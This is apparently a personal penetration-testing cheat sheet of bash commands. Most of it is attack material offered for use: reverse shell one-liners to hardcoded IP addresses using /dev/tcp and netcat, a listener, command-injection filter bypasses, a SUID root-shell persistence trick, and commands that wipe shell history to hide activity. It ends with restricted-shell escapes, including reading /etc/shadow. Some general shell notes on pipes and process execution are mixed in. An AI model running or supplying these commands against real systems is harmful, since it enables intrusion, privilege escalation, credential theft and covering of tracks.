# ---
# Reverse Shells
# - bash
# - nc
# - socat
# - openssl,icmpsh
#     see: https://py-sec.org/cheatsheet-linux/
# - powershell, asp, php, ruby, perl, node, python, vbscript, etc.
# - c binary, meterpreter, etc.
# - anything that can bind a network conn and pipe to process

# reverse shell from sh environment (compact)
bash -c 'exec setsid bash -i>/dev/tcp/192.168.119.198/443<&1'
# from an interactive bash prompt
exec setsid bash -i>/dev/tcp/192.168.119.198/443<&1 &

# spawn shell with netcat openbsd flavor that doesn't provide -e (still possible!)
 cd /tmp;mkfifo t;cat t|2>&1 exec setsid bash -i|nc 10.1.1.246 60443 >t&


# to avoid inheriting bad profile or rc settings (may need to specify PATH then)
--noprofile --norc
# `-p` privileged mode; uses suid and ignores env and config files
#      see: https://unix.stackexchange.com/questions/116792/privileged-mode-in-bash

# add common paths (particularly when no path is set, or a restricted path is set)
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# bash injection: if input is filtered, can try these variations:
garbage$({sleep,5})garbage
garbage;echo${IFS}5;garbage
echo$IFS$15


# creating a root shell (type of persistence, or possibly privesc if launched awkwardly)
# as root
cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash;
# as low user
/tmp/rootbash -p


# reverse shell on remote victim
bash -i >& /dev/tcp/192.168.119.198/80 0>&1

# hostile listener
sudo nc -vlp 80 -ns 192.168.119.198

# respect the ignore-space-prefixed-history 
$  export HISTCONTROL=ignorespace
# or, the more common default
$  export HISTCONTROL=ignoreboth

# * FAVORITE ***
# do not write this session's history
$  export HISTFILE=/dev/null

# truncate all history prior to this session
$  :>$HISTFILE

# truncate all history prior to this session, and
# do not write any further history from this session
$  :>$HISTFILE && export HISTFILE=/dev/null

# this both immediately truncates history file and does not write further for current session
# i don't like it because it truncates the history before i get a chance to dump it
$  export HISTFILESIZE=0

# other interesting env vars (see: `man bash`)
# HISTSIZE HISTFILESIZE HISTFILE HISTCONTROL HISTIGNORE HISTTIMEFORMAT

# trying to set a time format
# bash will always write unix timestamp format to the HISTFILE
# but when you type `history` it will show the format you configured.
 echo export HISTTIMEFORMAT='%Y-%m-%d_%H:%M:%S__' >> ~/.bashrc



# did you know you can pipe in a few crazy ways:
# `|&` pipe stdout AND stderr
# `|` redirect stdout of first to stdin of second
#     technically each process is executed in parallel,
#     but most are programmed to wait for stdin before continuing
# `<>` 
# `>`
# `<`
# NOTICE: the redirection cmds can even occur before the command!
# NOTICE: you can also use a command list `{ echo hi; echo b; } > /tmp/a`
#         to redirect the entire list (this is a built-in)

# when you input a termainal command and hit <ENTER>, here's what happens:
# ie. <notes.txt >/dev/null foo bar 35
# 1. shell forks itself
# 2. parent waits on child
# 3. child closes stdin, opens notes.txt for reading
# 4. child closes stdout, opens /dev/null for writing
# 5. child invokes `exec <cmd> <...args>`

# built-ins
# print a list of all commands built-in to the shell (ie. not separate processes)
help

# did you know you can switch tty two ways
# CTRL+ALT+F6 # switch to tty6
$ sudo chvt 6 # switch to tty6




# other shells:
# sh (Bourne shell) - Steven Bourne's shell (original; all others are copying it)
# ksh (Korn shell) - David Korn
# csh (C shell)
# zsh (Z shell)
# bash (Bourne again shell) - GNU project (why it became de-facto default)
# ash (Almquist shell)
# dash (Debian Almquist shell)

# command-based syntax (shells) vs. expression-based syntax (programming languages)


# Bash TCP Reverse Shell
# Everyone uses an approach like this, but I like how this launches bash in a new parent process that remains running even if the original process dies, which aids in persistence and obscuring the stages of an attack.
$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
$ exec setsid bash -i >/dev/tcp/192.168.119.198/80 <&1
# optional upgrade to pseudo-tty as necessary
$ python -c 'import pty; pty.spawn("/bin/bash")'


# ---
# Restricted Shell escape
#
sudo -l
less (!sh)
more (!sh)
vi/vim (!sh)
nmap --interactive + !sh
ftp (!sh)
gdb (!sh)
man -P "id" man
sudo man -P "cat /etc/shadow" man

find /home/bob -name test -exec /bin/sh
python -c 'import pty;pty.spawn("/bin/sh")'
perl -e 'exec "/bin/sh"'